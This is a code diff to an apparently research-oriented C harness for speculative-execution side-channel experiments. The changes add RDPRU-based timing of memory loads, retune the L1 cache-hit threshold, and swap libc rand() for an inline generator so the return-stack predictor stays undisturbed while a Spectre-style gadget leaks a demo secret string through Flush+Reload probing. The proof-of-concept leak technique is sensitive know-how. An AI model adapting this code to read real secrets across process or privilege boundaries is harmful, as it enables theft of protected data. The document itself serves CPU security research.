@@ -20,6 +20,16 @@ extern void spec_ret_gadget_burst(void *ptr);
 extern void spec_ret_store_gadget(void *ptr);
 extern void spec_read_gadget(void *secret, void *probe_array);
 extern long time_memory_load(void *ptr);
+extern long time_memory_load_rdpru(void *ptr);
+extern long time_memory_load_rdpru_aperf(void *ptr);
+
+#ifdef USE_RDPRU_APERF
+#define TIME_LOAD(ptr) time_memory_load_rdpru_aperf(ptr)
+#elif defined(USE_RDPRU)
+#define TIME_LOAD(ptr) time_memory_load_rdpru(ptr)
+#else
+#define TIME_LOAD(ptr) time_memory_load(ptr)
+#endif
 
 static const char secret[] = "this is my super secret value!";
 
@@ -28,7 +38,7 @@ static const char secret[] = "this is my super secret value!";
 #define PAGE_SIZE 4096
 #define CACHE_LINE_SIZE 64
 #define HIT_THRESHOLD_LLC 350
-#define HIT_THRESHOLD_L1 100
+#define HIT_THRESHOLD_L1 200
 #define DEFAULT_PRIVATE_CPU 0
 #define DEFAULT_LLC_PARENT_CPU 0
 #define DEFAULT_LLC_CHILD_CPU 2
@@ -141,14 +151,21 @@ static void flush_from_cache(void *buf, size_t bufsz) {
     }
 }
 
-static int probe(void *buf, int num_slots, int threshold, int *order) {
+// Simple inline LCG — avoids calling into libc (which would push/pop RSB entries
+// and corrupt the predictor state needed by spec_read_gadget).
+static unsigned int lcg_next(unsigned int state) {
+    return state * 1664525u + 1013904223u;
+}
+
+static int probe(void *buf, int num_slots, int threshold, int *order, unsigned int *lcg_state) {
     int found = -1;
 
     for (int i = 0; i < num_slots; i++) {
         order[i] = i;
     }
     for (int i = num_slots - 1; i > 0; i--) {
-        int j = rand() % (i + 1);
+        *lcg_state = lcg_next(*lcg_state);
+        int j = (int)(*lcg_state % (unsigned int)(i + 1));
         int tmp = order[i];
         order[i] = order[j];
         order[j] = tmp;
@@ -156,7 +173,7 @@ static int probe(void *buf, int num_slots, int threshold, int *order) {
 
     for (int i = 0; i < num_slots; i++) {
         char *ptr = (char *)buf + order[i] * PAGE_SIZE;
-        long load_time = time_memory_load(ptr);
+        long load_time = TIME_LOAD(ptr);
 
         if (load_time < threshold) {
             found = order[i];
@@ -231,6 +248,7 @@ static void print_summary(const experiment_config_t *config, const probe_stats_t
 static void child_process(const experiment_config_t *config, shared_t *shared,
                           void *buf, size_t buf_size) {
     probe_stats_t stats = {0};
+    unsigned int lcg_state = (unsigned int)time(NULL) ^ (unsigned int)getpid();
     int *order = malloc((size_t)config->slots * sizeof(int));
 
     if (order == NULL) {
@@ -247,7 +265,7 @@ static void child_process(const experiment_config_t *config, shared_t *shared,
     for (int t = 0; t < config->num_trials; t++) {
         sem_wait(&shared->trial_ready);
         record_probe_result(&stats, shared->target, probe(buf, config->slots,
-            config->cache_mode == CACHE_LLC ? HIT_THRESHOLD_LLC : HIT_THRESHOLD_L1, order));
+            config->cache_mode == CACHE_LLC ? HIT_THRESHOLD_LLC : HIT_THRESHOLD_L1, order, &lcg_state));
         flush_from_cache(buf, buf_size);
         sem_post(&shared->probe_done);
     }
@@ -277,6 +295,7 @@ static int probe_threshold(const experiment_config_t *config) {
 static void run_same_thread_experiment(const experiment_config_t *config, void *buf) {
     size_t buf_size = (size_t)config->slots * PAGE_SIZE;
     probe_stats_t stats = {0};
+    unsigned int lcg_state = (unsigned int)time(NULL) ^ (unsigned int)getpid();
     int *order = malloc((size_t)config->slots * sizeof(int));
 
     if (order == NULL) {
@@ -296,7 +315,7 @@ static void run_same_thread_experiment(const experiment_config_t *config, void *
         int found;
 
         execute_access(config, ptr);
-        found = probe(buf, config->slots, probe_threshold(config), order);
+        found = probe(buf, config->slots, probe_threshold(config), order, &lcg_state);
         record_probe_result(&stats, target, found);
         flush_from_cache(buf, buf_size);
     }
@@ -320,6 +339,7 @@ static void run_secret_experiment(int num_trials, int cpu) {
         perror("sched_setaffinity");
     printf("running on cpu %d\n", sched_getcpu());
     char guessed[sizeof(secret)] = {0};
+    unsigned int lcg_state = (unsigned int)time(NULL) ^ (unsigned int)getpid();
     int *order = malloc(NUM_BYTE_SLOTS * sizeof(int));
 
     if (order == NULL) {
@@ -334,7 +354,7 @@ static void run_secret_experiment(int num_trials, int cpu) {
         for (int t = 0; t < num_trials; t++) {
             flush_from_cache(probe_array, probe_size);
             spec_read_gadget((char *)secret + i, probe_array);
-            int found = probe(probe_array, NUM_BYTE_SLOTS, HIT_THRESHOLD_L1, order);
+            int found = probe(probe_array, NUM_BYTE_SLOTS, HIT_THRESHOLD_L1, order, &lcg_state);
             if (found >= 0)
                 hits[found]++;
         }
